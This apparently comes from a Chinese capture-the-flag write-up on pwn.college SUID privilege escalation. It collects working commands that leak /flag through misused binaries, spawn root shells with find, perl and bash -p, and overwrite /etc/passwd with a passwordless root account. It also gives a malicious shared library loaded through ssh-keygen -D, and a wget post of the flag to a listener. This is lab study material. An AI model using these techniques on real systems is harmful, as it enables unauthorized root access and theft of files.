genisoimage: Incorrect sort file format
        pwn.college{QjXhZmAQvY4fqUhC9UrYNM9XMuB.dVjNxwyM2gjMyEzW}
```

`genisoimage` 解析 `/flag` 这个文件作为排序文件，期待它是一个**文本格式的排序文件列表**.

`/flag` 实际上是存放**flag内容的文件**，里面内容格式肯定不符合排序文件格式要求.

当 `genisoimage` 尝试读取和解析这个文件失败时，程序报错，把文件的内容直接输出了.

> 触发错误,结果程序打印了真实的文件内容.
>

### 常见的可执行命令

`env` 命令主要是用来显示当前 shell 环境中的所有环境变量及其值。

```sh
bash-5.2$ /challenge/env cat /flag 
pwn.college{8eNtwIFs0HK5qCufCyqwir46M1Q.dZjNxwyM2gjMyEzW}
```

**find** + exec执行:

```sh
/challenge/find / -exec cat /flag \; 2>/dev/null
```



2>/dev/null是忽略错误信息.

|        方法         |   适用场景   |                       示例                       |
| :-----------------: | :----------: | :----------------------------------------------: |
| `find / -name flag` | 查找 `/flag` |         `find / -name flag 2>/dev/null`          |
|  `-exec cat /flag`  | SUID `find`  |      `/challenge/find / -exec cat /flag \;`      |
|   `-exec /bin/sh`   |  SUID 提权   |     `/challenge/find / -exec /bin/sh -p \;`      |
|   `-fprint` 泄露    |   绕过过滤   | `/challenge/find / -name flag -fprint /tmp/leak` |
|    `LD_PRELOAD`     |    劫持库    |   `LD_PRELOAD=/tmp/evil.so /challenge/find /`    |

如果用**make**呢?把你要执行的shell写道Makefile里面去,接着make run.

```sh
bash-5.2$ echo 'run: ; cat /flag' > Makefile
bash-5.2$ make run
```

**nice** -n 19 ...	用来调整进程的优先级,所以可以直接执行.

**timeout** 10 cat /flag	用来限制程序运行的时间

**stdbuf**	用来修改标准I/O的缓冲行为

```sh
/challenge/stdbuf -i0 cat /flag 
```

这就是禁用了缓冲行为.

**setarch**	修改体系结构,环境内存

比如关闭ASLR栈随机化:

```sh
setarch -R /challenge/binary  # -R 禁用ASLR
```

**watch**	定期监控文件的变化:

```sh
watch -n 1 "ls -l /flag"  # 每秒检查/flag权限/内容变化
watch -n 0.1 "tail -c 10 /tmp/secret_buffer"  # 监控临时文件泄露
watch -x cat /flag
```

### socat网络工具

```sh
socat -u "file:/flag" -
```

做单向文件读取的操作.

### 脚本对话框 whiptail

```sh
whiptail --textbox /flag 20 80
```

对话框形式显示文件内容.

### 流式文本编辑器

awk	sed	ed

awk

```sh
/challenge/awk '{print}' /flag 
awk 'BEGIN {system("cat /flag")}'
awk 'BEGIN {for (k in ENVIRON) print k"="ENVIRON[k]}'
awk 'BEGIN {while (("find / -name flag 2>/dev/null" | getline r) > 0) print r}'
```

sed

```sh
sed '' /flag
sed -n p /flag  # 必须显式使用p命令才会输出
```

ed

ed命令 是单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工 作模式。ed命令支持多个内置命令，常见内置命令如下：

> ​	这个ed又难使用,又老.

1. A # 切换到输入模式，在文件的最后一行之后输入新的内容；

2. C # 切换到输入模式，用输入的内容替换掉最后一行的内容；

3. i # 切换到输入模式，在当前行之前加入一个新的空行来输入内容；

4. d # 用于删除最后一行文本内容；

5. n # 用于显示最后一行的行号和内容；

6. w # <文件名>：一给定的文件名保存当前正在编辑的文件；

7. q # 退出ed编辑器。

   ```sh
   ed /flag <<< $',p\nq'
   ```

### 修改文件归属者和权限问题

​	**chown**命令 改变某个文件或目录的所有者和所属的组，该命令可以向某个用户授权，使该用户变成指定文件的所有者或者改变文件所属的组。用户可以是用户或者是用户D，用户组可以是组名或组id。文件名可以使由空格分开的文件列表，在文件名中可以包含通配符。

​	**chmod**命令 可以通过符号组合的方式更改目标文件或目录的权限。 通过八进制数的方式更改目标文件或目录的权限。 通过参考文件的权限来更改目标文件或目录的权限。

```sh
chown -c hacker /flag
changed ownership of '/flag' from root to hacker

chmod 777 /flag
```

### 文件移动 cp mv

cp怎么用?直接拿到输出流:

```sh
/challenge/cp /flag /dev/stdout 
pwn.college{gZXo02LhQhpar93h4H-YZMRMe8d.dFDOxwyM2gjMyEzW}
```

怎么用mv来解决?

> ​	直接用mv创建无密码的root用户,比较有意思.

```sh
echo "root::0:0::/:/bin/sh" > /tmp/fake_passwd  # 创建无密码 root 账户
/challenge/mv /tmp/fake_passwd /etc/passwd      # 尝试覆盖
su root                                        # 测试是否能提权
```

### 脚本解释器

perl脚本语言,清空环境变量并且执行命令,防止不安全报警.

反引号执行命令.

```sh
env -i /challenge/perl -e 'system("/bin/sh -p")'
```

py就更简单了.

ruby,代码直接写入一个临时的文件.

```sh
bash-5.2$ echo 'puts File.read("/flag")' > /tmp/read_flag.rb
/challenge/ruby /tmp/read_flag.rb
pwn.college{wtsWZe6UuaZ5gCu5nxDKd1pz1GP.dVDOxwyM2gjMyEzW}
```

bash -p 直接获取一个root shell

### 绕过

> ​	这里的基本逻辑就是,报错信息会有文件内部内容的反馈,而我们要利用的就是文件内部的这些信息.

**date**,暴露文件内容

```sh
/challenge/date -f /flag 
/challenge/date: invalid date ‘pwn.college{sQjICzidh1N3Htx7xYbfPsEWPCO.ddDOxwyM2gjMyEzW}’
```

**dmesg**:查看内核环形缓冲区（kernel ring buffer）日志的工具，通常用于调试系统启动和硬件问题.

dmesg -F直接就可以查看

用wc处理:

```sh
/challenge/wc --files0-from=flag 
/challenge/wc: 'pwn.college{MuqITaDu2AevhnD94BiPxQ2xwuV.dlDOxwyM2gjMyEzW}'$'\n': No such file or directory
```

gcc:用头文件报错的形式泄露flag.

```sh
bash-5.2$ echo '#include "/flag"' > /tmp/include_flag.c
/challenge/gcc /tmp/include_flag.c -o /tmp/fake 2>&1 | grep -A 20 -B 20 "error"
In file included from /tmp/include_flag.c:1:
/flag:1:4: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘.’ token
    1 | pwn.college{81dDFDZ-J0vHZ6jnOjG4NWrPp6A.dBTOxwyM2gjMyEzW}
      |    ^
/flag:1:13: error: invalid suffix "dDFDZ" on integer constant
    1 | pwn.college{81dDFDZ-J0vHZ6jnOjG4NWrPp6A.dBTOxwyM2gjMyEzW}
      |             ^~~~~~~
```

总之,我们有很多方法来让他报错:

|         方法         |                 命令示例                 |           泄露方式            |
| :------------------: | :--------------------------------------: | :---------------------------: |
| **直接编译 `/flag`** | `/challenge/gcc /flag -o /tmp/fake 2>&1` | 报错信息可能包含 `/flag` 内容 |
| **`#include` 包含**  | `echo '#include "/flag"' > /tmp/test.c`  |      预处理错误泄露内容       |
|   **`-E` 预处理**    |        `/challenge/gcc -E /flag`         |      展开宏或头文件内容       |
| **`-x c` 强制解析**  | `/challenge/gcc -x c /flag -o /tmp/fake` |       语法错误泄露内容        |
|    **`ld` 链接**     |   `/challenge/gcc -Wl,--verbose /flag`   |      链接器报错泄露内容       |
| **`objdump` 反汇编** | `/challenge/gcc -c /flag && objdump -D`  | 反汇编输出可能泄露二进制内容  |
|  **`strings` 过滤**  |  `/challenge/gcc /flag 2>&1 | strings`   |       提取可打印字符串        |
|  **`strace` 跟踪**   |      `strace /challenge/gcc /flag`       |     观察 `read` 系统调用      |

as:

```sh
bash-5.2$ echo '.include "/flag"' > exploit.S
bash-5.2$ /challenge/as exploit.S -o exploit.o 2>&1
/flag: Assembler messages:
/flag:1: Error: no such instruction: `pwn.college{8tUrSUsUtv-4Do9fqp7IAz7tUhW.dFTOxwyM2gjMyEzW}'
```

wget

netcat对于8888端口进行监听,wget进行上传.

```sh
bash-5.2$ nc -lp 8888 & /challenge/wget --post-file=/flag http://127.0.0.1:8888
[1] 2927
--2025-07-25 11:45:27--  http://127.0.0.1:8888/
Connecting to 127.0.0.1:8888... connected.
POST / HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 127.0.0.1:8888
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

pwn.college{UpNj4nAE9FehErapEL5pVsnxReJ.dJTOxwyM2gjMyEzW}
```

ssh-keygen,**一般程序suid提权思路**

> ​	比较难的部分.参考了https://www.freebuf.com/articles/database/321219.html,这篇博客,https://www.youtube.com/watch?v=14mIjpOXnrM&t=2878s,这是答案的讲解视频.

`ssh-keygen` 是一个用于生成、管理和转换 SSH 密钥的工具,主要用于身份验证.

我们写C程序:

```C
#include<stdio.h>
#include<stdlib.h>
#include <unistd.h>      
#include <fcntl.h>      
#include <sys/sendfile.h>
static void inject() __attribute__((constructor));
void C_GetFunctionList(){
sendfile(1,open("/flag",0),0,4096);
char *argvv[]={"bash","-p",NULL};
execvp("/bin/bash",argvv);
}
```

**构造函数声明**

```C
static void inject() __attribute__((constructor));
```

**作用**：

- `__attribute__((constructor))` 是 GCC 特性，标记 `inject()` 为 **共享库加载时自动执行的函数**。
- 无需手动调用，库被加载时会立即运行。

**伪造的 PKCS#11 函数**

```C
void C_GetFunctionList() {
    // 空函数体
}
```

**用途**：

- `ssh-keygen -D` 要求加载的库实现 PKCS#11 标准接口（如 `C_GetFunctionList`）。
- 即使不实现具体逻辑，也需声明该函数以通过校验。

**恶意代码（`inject` 函数）**

```C
static void inject() {
    // 读取并输出 /flag
    sendfile(1, open("/flag", 0), 0, 4096);

    // 启动 root shell
    char *argvv[] = {"bash", "-p", NULL};
    execvp("/bin/bash", argvv);
}
```

**逐行解析**：

1. **`sendfile(1, open("/flag", 0), 0, 4096)`**

   - `open("/flag", 0)`：以只读模式打开 `/flag` 文件，返回文件描述符（fd）。
   - `sendfile(1, fd, 0, 4096)`：将 `fd` 的内容发送到标准输出（`1`），最多读取 4096 字节。
   - **效果**：直接打印 `/flag` 的内容。

2. **`execvp("/bin/bash", ["bash", "-p", NULL])`**

   - `execvp` 替换当前进程为 `/bin/bash`，保留 SUID 权限（`-p` 参数）。

   - 

     对比 `system("bash -p")`

     ：

     - `system()` 会启动子进程，丢失 SUID 权限；
     - `execvp` 直接继承当前进程的权限（更可靠）。

**编译命令**

```sh
gcc -shared -fPIC -o su.os exploit.c
```

- `-shared`：生成共享库（`.so` 或 `.os`）。
- `-fPIC`：生成位置无关代码（必需）。
- 下面直接加载执行.

```sh
ssh-keygen -D ./su.os
```

> ​	两个关键点.

### **1. 为什么需要动态加载？**

#### **(1) 绕过静态编译限制**

- **静态编译**的程序会将所有代码和库打包到单个二进制文件中，无法在运行时插入外部代码。
- **动态加载**允许程序在运行时加载外部共享库（如 `.so` 或 `.os`），从而注入恶意逻辑。

#### **(2) 利用 SUID 权限继承**

- `ssh-keygen` 是 SUID root 程序，运行时具有 root 权限。
- 通过 `-D` 动态加载共享库时，库中的代码会继承 `ssh-keygen` 的 **root 权限**，从而实现提权。

#### **(3) 灵活性**

- 动态库可以独立编译和替换，无需重新编译主程序（如 `ssh-keygen`）。
- 适合快速测试和迭代攻击代码（如修改 `sendfile` 或 `execvp` 的逻辑）。

------

### **2. 为什么需要位置无关代码（PIC）？**

#### **(1) 共享库的内存地址不确定**

- 动态库会被加载到进程内存的 **任意地址**（由操作系统动态分配）。
- 如果代码不是位置无关的，它可能无法正确访问全局变量或函数（因为硬编码的地址会失效）。

#### **(2) PIC 的工作原理**

- PIC 代码通过 **全局偏移表（GOT, Global Offset Table）** 和 **过程链接表（PLT, Procedure Linkage Table）** 动态解析地址。
- 所有跳转和变量访问都基于相对偏移量，而非绝对地址。

#### **(3) 编译时的 `-fPIC` 选项**

```
gcc -shared -fPIC -o su.os exploit.c
```

- `-fPIC` 告诉编译器生成位置无关代码，确保共享库能在任何内存地址运行。

> ​	提权的问题到这里就告一段落.

## SQL Playground

> ​	关于SQL,我们也接触的时间比较长,主要使用MySQL,现在可以来看看这个有意思的话题.

s





























